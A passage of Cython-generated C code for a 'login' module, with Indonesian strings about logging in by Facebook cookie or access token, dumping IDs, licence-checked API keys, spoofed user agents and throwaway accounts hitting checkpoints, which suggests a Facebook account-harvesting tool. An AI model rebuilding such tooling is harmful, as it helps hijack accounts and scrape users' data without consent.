  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_cookie = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_cookie);
  __pyx_r = __pyx_v_cookie;
  goto __pyx_L0;

  

  
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("login.convert", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_cookie);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_5login_21real_time(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); 
static PyMethodDef __pyx_mdef_5login_21real_time = {"real_time", (PyCFunction)__pyx_pw_5login_21real_time, METH_NOARGS, 0};
static PyObject *__pyx_pw_5login_21real_time(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("real_time (wrapper)", 0);
  __pyx_r = __pyx_pf_5login_20real_time(__pyx_self);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_20real_time(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_time = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("real_time", 0);

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 250, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_time);
  __Pyx_GIVEREF(__pyx_n_s_time);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_time);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_time, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 250, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_time); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 250, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_t_1);
  __pyx_v_time = __pyx_t_1;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_time);
  __pyx_t_1 = __pyx_v_time; __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyUnicode_Split(((PyObject*)__pyx_t_1), __pyx_kp_u__22, -1L); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_GetItemInt_List(__pyx_t_2, 0, long, 1, __Pyx_PyInt_From_long, 1, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 251, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_r = __pyx_t_1;
  __pyx_t_1 = 0;
  goto __pyx_L0;

  

  
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("login.real_time", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_time);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); 
static int __pyx_pymod_exec_login(PyObject* module); 
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_login},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "login",
    0, 
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, 
  #else
    -1, 
  #endif
    __pyx_methods ,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, 
  #else
    NULL, 
  #endif
    NULL, 
    NULL, 
    NULL 
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 0},
  {&__pyx_kp_u_01, __pyx_k_01, sizeof(__pyx_k_01), 0, 1, 0, 0},
  {&__pyx_kp_u_02, __pyx_k_02, sizeof(__pyx_k_02), 0, 1, 0, 0},
  {&__pyx_kp_u_03, __pyx_k_03, sizeof(__pyx_k_03), 0, 1, 0, 0},
  {&__pyx_kp_u_04, __pyx_k_04, sizeof(__pyx_k_04), 0, 1, 0, 0},
  {&__pyx_kp_u_05, __pyx_k_05, sizeof(__pyx_k_05), 0, 1, 0, 0},
  {&__pyx_kp_u_06, __pyx_k_06, sizeof(__pyx_k_06), 0, 1, 0, 0},
  {&__pyx_kp_u_07, __pyx_k_07, sizeof(__pyx_k_07), 0, 1, 0, 0},
  {&__pyx_kp_u_08, __pyx_k_08, sizeof(__pyx_k_08), 0, 1, 0, 0},
  {&__pyx_kp_u_09, __pyx_k_09, sizeof(__pyx_k_09), 0, 1, 0, 0},
  {&__pyx_kp_u_0m, __pyx_k_0m, sizeof(__pyx_k_0m), 0, 1, 0, 0},
  {&__pyx_kp_u_1, __pyx_k_1, sizeof(__pyx_k_1), 0, 1, 0, 0},
  {&__pyx_kp_u_10, __pyx_k_10, sizeof(__pyx_k_10), 0, 1, 0, 0},
  {&__pyx_kp_u_11, __pyx_k_11, sizeof(__pyx_k_11), 0, 1, 0, 0},
  {&__pyx_kp_u_12, __pyx_k_12, sizeof(__pyx_k_12), 0, 1, 0, 0},
  {&__pyx_kp_u_1_2, __pyx_k_1_2, sizeof(__pyx_k_1_2), 0, 1, 0, 0},
  {&__pyx_kp_u_1_91m, __pyx_k_1_91m, sizeof(__pyx_k_1_91m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_92m, __pyx_k_1_92m, sizeof(__pyx_k_1_92m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_93m, __pyx_k_1_93m, sizeof(__pyx_k_1_93m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_94m, __pyx_k_1_94m, sizeof(__pyx_k_1_94m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_95m, __pyx_k_1_95m, sizeof(__pyx_k_1_95m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_96m, __pyx_k_1_96m, sizeof(__pyx_k_1_96m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_97m, __pyx_k_1_97m, sizeof(__pyx_k_1_97m), 0, 1, 0, 0},
  {&__pyx_kp_u_2, __pyx_k_2, sizeof(__pyx_k_2), 0, 1, 0, 0},
  {&__pyx_kp_u_3, __pyx_k_3, sizeof(__pyx_k_3), 0, 1, 0, 0},
  {&__pyx_kp_u_4, __pyx_k_4, sizeof(__pyx_k_4), 0, 1, 0, 0},
  {&__pyx_kp_u_5, __pyx_k_5, sizeof(__pyx_k_5), 0, 1, 0, 0},
  {&__pyx_kp_u_6, __pyx_k_6, sizeof(__pyx_k_6), 0, 1, 0, 0},
  {&__pyx_kp_u_7, __pyx_k_7, sizeof(__pyx_k_7), 0, 1, 0, 0},
  {&__pyx_kp_u_8, __pyx_k_8, sizeof(__pyx_k_8), 0, 1, 0, 0},
  {&__pyx_kp_u_9, __pyx_k_9, sizeof(__pyx_k_9), 0, 1, 0, 0},
  {&__pyx_n_u_Agustus, __pyx_k_Agustus, sizeof(__pyx_k_Agustus), 0, 1, 0, 1},
  {&__pyx_kp_u_Anda_bisa_mengambil_cookie_denga, __pyx_k_Anda_bisa_mengambil_cookie_denga, sizeof(__pyx_k_Anda_bisa_mengambil_cookie_denga), 0, 1, 0, 0},
  {&__pyx_kp_u_Anda_bisa_mengambil_token_dengan, __pyx_k_Anda_bisa_mengambil_token_dengan, sizeof(__pyx_k_Anda_bisa_mengambil_token_dengan), 0, 1, 0, 0},
  {&__pyx_n_s_ApiKey, __pyx_k_ApiKey, sizeof(__pyx_k_ApiKey), 0, 0, 1, 1},
  {&__pyx_n_u_April, __pyx_k_April, sizeof(__pyx_k_April), 0, 1, 0, 1},
  {&__pyx_n_s_AttributeError, __pyx_k_AttributeError, sizeof(__pyx_k_AttributeError), 0, 0, 1, 1},
  {&__pyx_n_s_B, __pyx_k_B, sizeof(__pyx_k_B), 0, 0, 1, 1},
  {&__pyx_n_s_BeautifulSoup, __pyx_k_BeautifulSoup, sizeof(__pyx_k_BeautifulSoup), 0, 0, 1, 1},
  {&__pyx_n_u_COOKIE, __pyx_k_COOKIE, sizeof(__pyx_k_COOKIE), 0, 1, 0, 1},
  {&__pyx_n_s_ConnectionError, __pyx_k_ConnectionError, sizeof(__pyx_k_ConnectionError), 0, 0, 1, 1},
  {&__pyx_n_u_December, __pyx_k_December, sizeof(__pyx_k_December), 0, 1, 0, 1},
  {&__pyx_n_u_Desember, __pyx_k_Desember, sizeof(__pyx_k_Desember), 0, 1, 0, 1},
  {&__pyx_kp_u_Device_Terpakai, __pyx_k_Device_Terpakai, sizeof(__pyx_k_Device_Terpakai), 0, 1, 0, 0},
  {&__pyx_n_s_Dump, __pyx_k_Dump, sizeof(__pyx_k_Dump), 0, 0, 1, 1},
  {&__pyx_n_u_EAA, __pyx_k_EAA, sizeof(__pyx_k_EAA), 0, 1, 0, 1},
  {&__pyx_kp_u_EAAG_w, __pyx_k_EAAG_w, sizeof(__pyx_k_EAAG_w), 0, 1, 0, 0},
  {&__pyx_kp_u_EAA_w, __pyx_k_EAA_w, sizeof(__pyx_k_EAA_w), 0, 1, 0, 0},
  {&__pyx_kp_u_Email_Apikey, __pyx_k_Email_Apikey, sizeof(__pyx_k_Email_Apikey), 0, 1, 0, 0},
  {&__pyx_n_u_Februari, __pyx_k_Februari, sizeof(__pyx_k_Februari), 0, 1, 0, 1},
  {&__pyx_n_u_February, __pyx_k_February, sizeof(__pyx_k_February), 0, 1, 0, 1},
  {&__pyx_n_s_FileNotFoundError, __pyx_k_FileNotFoundError, sizeof(__pyx_k_FileNotFoundError), 0, 0, 1, 1},
  {&__pyx_n_u_Friday, __pyx_k_Friday, sizeof(__pyx_k_Friday), 0, 1, 0, 1},
  {&__pyx_n_s_H, __pyx_k_H, sizeof(__pyx_k_H), 0, 0, 1, 1},
  {&__pyx_n_u_Host, __pyx_k_Host, sizeof(__pyx_k_Host), 0, 1, 0, 1},
  {&__pyx_n_u_INFO, __pyx_k_INFO, sizeof(__pyx_k_INFO), 0, 1, 0, 1},
  {&__pyx_n_s_IP, __pyx_k_IP, sizeof(__pyx_k_IP), 0, 0, 1, 1},
  {&__pyx_n_u_Januari, __pyx_k_Januari, sizeof(__pyx_k_Januari), 0, 1, 0, 1},
  {&__pyx_n_u_January, __pyx_k_January, sizeof(__pyx_k_January), 0, 1, 0, 1},
  {&__pyx_n_u_Juli, __pyx_k_Juli, sizeof(__pyx_k_Juli), 0, 1, 0, 1},
  {&__pyx_n_u_July, __pyx_k_July, sizeof(__pyx_k_July), 0, 1, 0, 1},
  {&__pyx_n_u_Jumat, __pyx_k_Jumat, sizeof(__pyx_k_Jumat), 0, 1, 0, 1},
  {&__pyx_n_u_June, __pyx_k_June, sizeof(__pyx_k_June), 0, 1, 0, 1},
  {&__pyx_n_u_Juni, __pyx_k_Juni, sizeof(__pyx_k_Juni), 0, 1, 0, 1},
  {&__pyx_n_s_K, __pyx_k_K, sizeof(__pyx_k_K), 0, 0, 1, 1},
  {&__pyx_n_u_Kamis, __pyx_k_Kamis, sizeof(__pyx_k_Kamis), 0, 1, 0, 1},
  {&__pyx_n_s_KeyError, __pyx_k_KeyError, sizeof(__pyx_k_KeyError), 0, 0, 1, 1},
  {&__pyx_n_s_M, __pyx_k_M, sizeof(__pyx_k_M), 0, 0, 1, 1},
  {&__pyx_n_u_March, __pyx_k_March, sizeof(__pyx_k_March), 0, 1, 0, 1},
  {&__pyx_n_u_Maret, __pyx_k_Maret, sizeof(__pyx_k_Maret), 0, 1, 0, 1},
  {&__pyx_kp_u_Masukan_Email, __pyx_k_Masukan_Email, sizeof(__pyx_k_Masukan_Email), 0, 1, 0, 0},
  {&__pyx_kp_u_Masukan_Sandi, __pyx_k_Masukan_Sandi, sizeof(__pyx_k_Masukan_Sandi), 0, 1, 0, 0},
  {&__pyx_n_u_May, __pyx_k_May, sizeof(__pyx_k_May), 0, 1, 0, 1},
  {&__pyx_n_u_Mei, __pyx_k_Mei, sizeof(__pyx_k_Mei), 0, 1, 0, 1},
  {&__pyx_n_s_Menu, __pyx_k_Menu, sizeof(__pyx_k_Menu), 0, 0, 1, 1},
  {&__pyx_n_s_MenuLain, __pyx_k_MenuLain, sizeof(__pyx_k_MenuLain), 0, 0, 1, 1},
  {&__pyx_n_u_Minggu, __pyx_k_Minggu, sizeof(__pyx_k_Minggu), 0, 1, 0, 1},
  {&__pyx_n_u_Monday, __pyx_k_Monday, sizeof(__pyx_k_Monday), 0, 1, 0, 1},
  {&__pyx_kp_u_Mozilla_5_0_Linux_Android_12_SAM, __pyx_k_Mozilla_5_0_Linux_Android_12_SAM, sizeof(__pyx_k_Mozilla_5_0_Linux_Android_12_SAM), 0, 1, 0, 0},
  {&__pyx_kp_u_Mozilla_5_0_Linux_Android_6_0_1, __pyx_k_Mozilla_5_0_Linux_Android_6_0_1, sizeof(__pyx_k_Mozilla_5_0_Linux_Android_6_0_1), 0, 1, 0, 0},
  {&__pyx_kp_u_Mozilla_5_0_Linux_Android_8_1_0, __pyx_k_Mozilla_5_0_Linux_Android_8_1_0, sizeof(__pyx_k_Mozilla_5_0_Linux_Android_8_1_0), 0, 1, 0, 0},
  {&__pyx_n_s_N, __pyx_k_N, sizeof(__pyx_k_N), 0, 0, 1, 1},
  {&__pyx_kp_u_Nama_Apikey, __pyx_k_Nama_Apikey, sizeof(__pyx_k_Nama_Apikey), 0, 1, 0, 0},
  {&__pyx_kp_u_NokiaC3_00_5_0_08_63_Profile_MID, __pyx_k_NokiaC3_00_5_0_08_63_Profile_MID, sizeof(__pyx_k_NokiaC3_00_5_0_08_63_Profile_MID), 0, 1, 0, 0},
  {&__pyx_n_u_November, __pyx_k_November, sizeof(__pyx_k_November), 0, 1, 0, 1},
  {&__pyx_n_s_O, __pyx_k_O, sizeof(__pyx_k_O), 0, 0, 1, 1},
  {&__pyx_n_u_October, __pyx_k_October, sizeof(__pyx_k_October), 0, 1, 0, 1},
  {&__pyx_n_u_Oktober, __pyx_k_Oktober, sizeof(__pyx_k_Oktober), 0, 1, 0, 1},
  {&__pyx_n_s_P, __pyx_k_P, sizeof(__pyx_k_P), 0, 0, 1, 1},
  {&__pyx_n_s_Panel, __pyx_k_Panel, sizeof(__pyx_k_Panel), 0, 0, 1, 1},
  {&__pyx_kp_u_Pilih, __pyx_k_Pilih, sizeof(__pyx_k_Pilih), 0, 1, 0, 0},
  {&__pyx_kp_u_Pilih_Nomer_Token_Untuk_Login, __pyx_k_Pilih_Nomer_Token_Untuk_Login, sizeof(__pyx_k_Pilih_Nomer_Token_Untuk_Login), 0, 1, 0, 0},
  {&__pyx_n_u_Rabu, __pyx_k_Rabu, sizeof(__pyx_k_Rabu), 0, 1, 0, 1},
  {&__pyx_n_u_Sabtu, __pyx_k_Sabtu, sizeof(__pyx_k_Sabtu), 0, 1, 0, 1},
  {&__pyx_kp_u_Sampai, __pyx_k_Sampai, sizeof(__pyx_k_Sampai), 0, 1, 0, 0},
  {&__pyx_n_u_Saturday, __pyx_k_Saturday, sizeof(__pyx_k_Saturday), 0, 1, 0, 1},
  {&__pyx_n_u_Selasa, __pyx_k_Selasa, sizeof(__pyx_k_Selasa), 0, 1, 0, 1},
  {&__pyx_n_u_Senin, __pyx_k_Senin, sizeof(__pyx_k_Senin), 0, 1, 0, 1},
  {&__pyx_n_u_September, __pyx_k_September, sizeof(__pyx_k_September), 0, 1, 0, 1},
  {&__pyx_n_s_Session, __pyx_k_Session, sizeof(__pyx_k_Session), 0, 0, 1, 1},
  {&__pyx_kp_u_Silahkan_masukkan_email_no_hp_id, __pyx_k_Silahkan_masukkan_email_no_hp_id, sizeof(__pyx_k_Silahkan_masukkan_email_no_hp_id), 0, 1, 0, 0},
  {&__pyx_kp_u_Sisa_Waktu_Apikey, __pyx_k_Sisa_Waktu_Apikey, sizeof(__pyx_k_Sisa_Waktu_Apikey), 0, 1, 0, 0},
  {&__pyx_n_u_Sunday, __pyx_k_Sunday, sizeof(__pyx_k_Sunday), 0, 1, 0, 1},
  {&__pyx_n_u_TOKEN, __pyx_k_TOKEN, sizeof(__pyx_k_TOKEN), 0, 1, 0, 1},
  {&__pyx_kp_u_Tgl_Bergabung, __pyx_k_Tgl_Bergabung, sizeof(__pyx_k_Tgl_Bergabung), 0, 1, 0, 0},
  {&__pyx_kp_u_Tgl_Kadaluwarsa, __pyx_k_Tgl_Kadaluwarsa, sizeof(__pyx_k_Tgl_Kadaluwarsa), 0, 1, 0, 0},
  {&__pyx_n_u_Thursday, __pyx_k_Thursday, sizeof(__pyx_k_Thursday), 0, 1, 0, 1},
  {&__pyx_n_s_Tree, __pyx_k_Tree, sizeof(__pyx_k_Tree), 0, 0, 1, 1},
  {&__pyx_n_u_Tuesday, __pyx_k_Tuesday, sizeof(__pyx_k_Tuesday), 0, 1, 0, 1},
  {&__pyx_n_s_U, __pyx_k_U, sizeof(__pyx_k_U), 0, 0, 1, 1},
  {&__pyx_n_s_ValueError, __pyx_k_ValueError, sizeof(__pyx_k_ValueError), 0, 0, 1, 1},
  {&__pyx_n_s_WAR, __pyx_k_WAR, sizeof(__pyx_k_WAR), 0, 0, 1, 1},
  {&__pyx_n_u_Wednesday, __pyx_k_Wednesday, sizeof(__pyx_k_Wednesday), 0, 1, 0, 1},
  {&__pyx_n_u_Y, __pyx_k_Y, sizeof(__pyx_k_Y), 0, 1, 0, 1},
  {&__pyx_kp_u__16, __pyx_k__16, sizeof(__pyx_k__16), 0, 1, 0, 0},
  {&__pyx_kp_u__22, __pyx_k__22, sizeof(__pyx_k__22), 0, 1, 0, 0},
  {&__pyx_kp_u__23, __pyx_k__23, sizeof(__pyx_k__23), 0, 1, 0, 0},
  {&__pyx_kp_u__4, __pyx_k__4, sizeof(__pyx_k__4), 0, 1, 0, 0},
  {&__pyx_kp_u__5, __pyx_k__5, sizeof(__pyx_k__5), 0, 1, 0, 0},
  {&__pyx_n_s_a, __pyx_k_a, sizeof(__pyx_k_a), 0, 0, 1, 1},
  {&__pyx_n_u_accept, __pyx_k_accept, sizeof(__pyx_k_accept), 0, 1, 0, 1},
  {&__pyx_kp_u_accept_encoding, __pyx_k_accept_encoding, sizeof(__pyx_k_accept_encoding), 0, 1, 0, 0},
  {&__pyx_kp_u_accept_language, __pyx_k_accept_language, sizeof(__pyx_k_accept_language), 0, 1, 0, 0},
  {&__pyx_n_u_agustus, __pyx_k_agustus, sizeof(__pyx_k_agustus), 0, 1, 0, 1},
  {&__pyx_n_s_allow_redirects, __pyx_k_allow_redirects, sizeof(__pyx_k_allow_redirects), 0, 0, 1, 1},
  {&__pyx_kp_u_apakah_kamu_ingin_menghapus_api, __pyx_k_apakah_kamu_ingin_menghapus_api, sizeof(__pyx_k_apakah_kamu_ingin_menghapus_api), 0, 1, 0, 0},
  {&__pyx_n_s_apikey, __pyx_k_apikey, sizeof(__pyx_k_apikey), 0, 0, 1, 1},
  {&__pyx_n_s_append, __pyx_k_append, sizeof(__pyx_k_append), 0, 0, 1, 1},
  {&__pyx_kp_u_application_x_www_form_urlencode, __pyx_k_application_x_www_form_urlencode, sizeof(__pyx_k_application_x_www_form_urlencode), 0, 1, 0, 0},
  {&__pyx_n_u_april, __pyx_k_april, sizeof(__pyx_k_april), 0, 1, 0, 1},
  {&__pyx_n_u_august, __pyx_k_august, sizeof(__pyx_k_august), 0, 1, 0, 1},
  {&__pyx_n_s_b, __pyx_k_b, sizeof(__pyx_k_b), 0, 0, 1, 1},
  {&__pyx_n_s_bergabung, __pyx_k_bergabung, sizeof(__pyx_k_bergabung), 0, 0, 1, 1},
  {&__pyx_kp_u_berhasil_menghapus_apikey, __pyx_k_berhasil_menghapus_apikey, sizeof(__pyx_k_berhasil_menghapus_apikey), 0, 1, 0, 0},
  {&__pyx_kp_u_blue, __pyx_k_blue, sizeof(__pyx_k_blue), 0, 1, 0, 0},
  {&__pyx_kp_u_bold, __pyx_k_bold, sizeof(__pyx_k_bold), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_01_Login_Dengan_Token_06_B, __pyx_k_bold_01_Login_Dengan_Token_06_B, sizeof(__pyx_k_bold_01_Login_Dengan_Token_06_B), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_DATA_APIKEY, __pyx_k_bold_DATA_APIKEY, sizeof(__pyx_k_bold_DATA_APIKEY), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_MENU_LOGIN, __pyx_k_bold_MENU_LOGIN, sizeof(__pyx_k_bold_MENU_LOGIN), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_Status_Apikey, __pyx_k_bold_Status_Apikey, sizeof(__pyx_k_bold_Status_Apikey), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_green, __pyx_k_bold_green, sizeof(__pyx_k_bold_green), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_red_Akun_tumbal_terkena_ch, __pyx_k_bold_red_Akun_tumbal_terkena_ch, sizeof(__pyx_k_bold_red_Akun_tumbal_terkena_ch), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_red_Cookie_invalid_atau_ti, __pyx_k_bold_red_Cookie_invalid_atau_ti, sizeof(__pyx_k_bold_red_Cookie_invalid_atau_ti), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_red_Email_atau_kata_sandi, __pyx_k_bold_red_Email_atau_kata_sandi, sizeof(__pyx_k_bold_red_Email_atau_kata_sandi), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_red_Maaf_lisensi_anda_tida, __pyx_k_bold_red_Maaf_lisensi_anda_tida, sizeof(__pyx_k_bold_red_Maaf_lisensi_anda_tida), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_red_Token_invalid_atau_tid, __pyx_k_bold_red_Token_invalid_atau_tid, sizeof(__pyx_k_bold_red_Token_invalid_atau_tid), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_white, __pyx_k_bold_white, sizeof(__pyx_k_bold_white), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_white_Author_Fall_Xavier_V, __pyx_k_bold_white_Author_Fall_Xavier_V, sizeof(__pyx_k_bold_white_Author_Fall_Xavier_V), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_white_Selamat_Datang_bold, __pyx_k_bold_white_Selamat_Datang_bold, sizeof(__pyx_k_bold_white_Selamat_Datang_bold), 0, 1, 0, 0},
  {&__pyx_kp_u_bold_white_User_Premium, __pyx_k_bold_white_User_Premium, sizeof(__pyx_k_bold_white_User_Premium), 0, 1, 0, 0},
  {&__pyx_n_s_bs4, __pyx_k_bs4, sizeof(__pyx_k_bs4), 0, 0, 1, 1},
  {&__pyx_n_s_bu, __pyx_k_bu, sizeof(__pyx_k_bu), 0, 0, 1, 1},
  {&__pyx_n_s_bulan, __pyx_k_bulan, sizeof(__pyx_k_bulan), 0, 0, 1, 1},
  {&__pyx_n_s_bulan_balik, __pyx_k_bulan_balik, sizeof(__pyx_k_bulan_balik), 0, 0, 1, 1},
  {&__pyx_n_s_bulan_ttl, __pyx_k_bulan_ttl, sizeof(__pyx_k_bulan_ttl), 0, 0, 1, 1},
  {&__pyx_n_s_bulan_x, __pyx_k_bulan_x, sizeof(__pyx_k_bulan_x), 0, 0, 1, 1},
  {&__pyx_kp_u_business_facebook_com, __pyx_k_business_facebook_com, sizeof(__pyx_k_business_facebook_com), 0, 1, 0, 0},
  {&__pyx_n_u_c_user, __pyx_k_c_user, sizeof(__pyx_k_c_user), 0, 1, 0, 1},
  {&__pyx_kp_u_c_user_2, __pyx_k_c_user_2, sizeof(__pyx_k_c_user_2), 0, 1, 0, 0},
  {&__pyx_kp_u_cache_control, __pyx_k_cache_control, sizeof(__pyx_k_cache_control), 0, 1, 0, 0},
  {&__pyx_n_s_calendar, __pyx_k_calendar, sizeof(__pyx_k_calendar), 0, 0, 1, 1},
  {&__pyx_n_s_cek_hasil, __pyx_k_cek_hasil, sizeof(__pyx_k_cek_hasil), 0, 0, 1, 1},
  {&__pyx_n_s_cek_opsi, __pyx_k_cek_opsi, sizeof(__pyx_k_cek_opsi), 0, 0, 1, 1},
  {&__pyx_n_s_ceklisen, __pyx_k_ceklisen, sizeof(__pyx_k_ceklisen), 0, 0, 1, 1},
  {&__pyx_n_u_checkpoint, __pyx_k_checkpoint, sizeof(__pyx_k_checkpoint), 0, 1, 0, 1},
  {&__pyx_n_s_choice, __pyx_k_choice, sizeof(__pyx_k_choice), 0, 0, 1, 1},
  {&__pyx_n_u_chrome, __pyx_k_chrome, sizeof(__pyx_k_chrome), 0, 1, 0, 1},
  {&__pyx_n_u_clear, __pyx_k_clear, sizeof(__pyx_k_clear), 0, 1, 0, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_cok, __pyx_k_cok, sizeof(__pyx_k_cok), 0, 0, 1, 1},
  {&__pyx_kp_u_content_type, __pyx_k_content_type, sizeof(__pyx_k_content_type), 0, 1, 0, 0},
  {&__pyx_n_s_convert, __pyx_k_convert, sizeof(__pyx_k_convert), 0, 0, 1, 1},
  {&__pyx_n_s_cookie, __pyx_k_cookie, sizeof(__pyx_k_cookie), 0, 0, 1, 1},
  {&__pyx_n_u_cookie, __pyx_k_cookie, sizeof(__pyx_k_cookie), 0, 1, 0, 1},
  {&__pyx_n_s_cookies, __pyx_k_cookies, sizeof(__pyx_k_cookies), 0, 0, 1, 1},
  {&__pyx_n_u_cors, __pyx_k_cors, sizeof(__pyx_k_cors), 0, 1, 0, 1},
  {&__pyx_n_s_ct, __pyx_k_ct, sizeof(__pyx_k_ct), 0, 0, 1, 1},
  {&__pyx_n_s_current, __pyx_k_current, sizeof(__pyx_k_current), 0, 0, 1, 1},
  {&__pyx_n_s_cv_hr, __pyx_k_cv_hr, sizeof(__pyx_k_cv_hr), 0, 0, 1, 1},
  {&__pyx_kp_u_cyan, __pyx_k_cyan, sizeof(__pyx_k_cyan), 0, 1, 0, 0},
  {&__pyx_kp_u_d_m_Y, __pyx_k_d_m_Y, sizeof(__pyx_k_d_m_Y), 0, 1, 0, 0},
  {&__pyx_n_s_das, __pyx_k_das, sizeof(__pyx_k_das), 0, 0, 1, 1},
  {&__pyx_n_s_data, __pyx_k_data, sizeof(__pyx_k_data), 0, 0, 1, 1},
  {&__pyx_n_s_data2, __pyx_k_data2, sizeof(__pyx_k_data2), 0, 0, 1, 1},
  {&__pyx_kp_u_data_apikey_txt, __pyx_k_data_apikey_txt, sizeof(__pyx_k_data_apikey_txt), 0, 1, 0, 0},
  {&__pyx_kp_u_data_cookie_txt, __pyx_k_data_cookie_txt, sizeof(__pyx_k_data_cookie_txt), 0, 1, 0, 0},
